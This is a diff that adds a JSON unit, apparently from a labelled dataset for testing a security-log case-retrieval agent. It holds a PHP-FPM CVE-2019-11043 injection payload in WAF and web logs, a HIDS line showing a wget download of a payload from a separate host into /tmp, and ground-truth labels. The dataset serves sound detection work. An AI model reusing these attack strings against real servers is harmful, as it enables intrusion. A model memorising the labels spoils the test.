@@ -1,0 +1,127 @@
+{
+ "unit": 1012,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "PHP-FPM CVE-2019-11043（PATH_INFO 换行注入 auto_prepend_file）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-08 13:31:44",
+   "source": "waf",
+   "log_id": "WAF0252379",
+   "content": "/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In",
+   "event_id": "1012-WAF0252379"
+  },
+  {
+   "timestamp": "2026-06-08 13:31:45",
+   "source": "web",
+   "log_id": "WEB0254022",
+   "content": "/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In",
+   "event_id": "1012-WEB0254022"
+  },
+  {
+   "timestamp": "2026-06-08 13:31:47",
+   "source": "rasp",
+   "log_id": "RASP0279222",
+   "content": "https://app-php-118.ops-corp.com/index.php {\"fpm_newline\": \"auto_prepend\"} Mozilla/5.0 (Macintosh; Intel Mac O",
+   "event_id": "1012-RASP0279222"
+  },
+  {
+   "timestamp": "2026-06-08 13:33:17",
+   "source": "hids",
+   "log_id": "HID0273512",
+   "content": "wget -qO /tmp/.f 10.20.5.77/f <== /bin/sh -c 'wget -qO /tmp/.f 10.20.5.77/f' <== php-fpm: pool www",
+   "event_id": "1012-HID0273512"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-004",
+   "name": "Laravel Ignition 反序列化 RCE + cron 持久化",
+   "summary": "请求 _ignition/execute-solution 触发 phar 反序列化 → 应用侧记录 phar:// 载荷 → PHP-FPM 派生子 shell 执行 id → 追加 crontab 定时回连。",
+   "matched_steps": 0,
+   "detected_steps": 0,
+   "total_steps": 4,
+   "shape": "none",
+   "longest_run": 0,
+   "tier": "keyword_only",
+   "order_ok": false,
+   "order_assessable": false,
+   "source_fit_ratio": 0.0,
+   "evidence": [],
+   "source_mismatches": [],
+   "unaligned_detections": [],
+   "keyword_score": 3,
+   "keyword_details": [
+    "keyword +3: php-fpm"
+   ],
+   "mitre": [
+    "T1190",
+    "T1059.004",
+    "T1053.003"
+   ],
+   "unobserved_steps": [
+    "S1",
+    "S2",
+    "S3",
+    "S4"
+   ],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 0,
+   "pattern_scope": {
+    "attack_family": "Laravel Ignition 反序列化（CVE-2021-3129）",
+    "variant_note": "单样本归纳；phar 落地路径与持久化命令来自该样本。"
+   },
+   "negative_and_unknown_evidence": {
+    "not_observed": [
+     "横向移动",
+     "凭据窃取"
+    ],
+    "interpretation": "未观察到不等同于确认不存在；需结合日志覆盖范围判断。"
+   },
+   "provenance": {
+    "observation_count": 1,
+    "evidence_status": "single_observation_demo",
+    "observation_count_note": "由 dataset 每类第 1 个 unit 作为首批代表样本入库；原始行保存在 raw_logs.csv。"
+   }
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "keyword_only",
+  "shape": "none",
+  "matched_steps": 0,
+  "total_steps": 4,
+  "order_ok": false,
+  "order_assessable": false,
+  "source_fit_ratio": 0.0,
+  "steps": [],
+  "unobserved_steps": [
+   "S1",
+   "S2",
+   "S3",
+   "S4"
+  ],
+  "gap_steps": [],
+  "before_steps": [],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 3,
+  "mitre": [
+   "T1190",
+   "T1059.004",
+   "T1053.003"
+  ]
+ }
+}
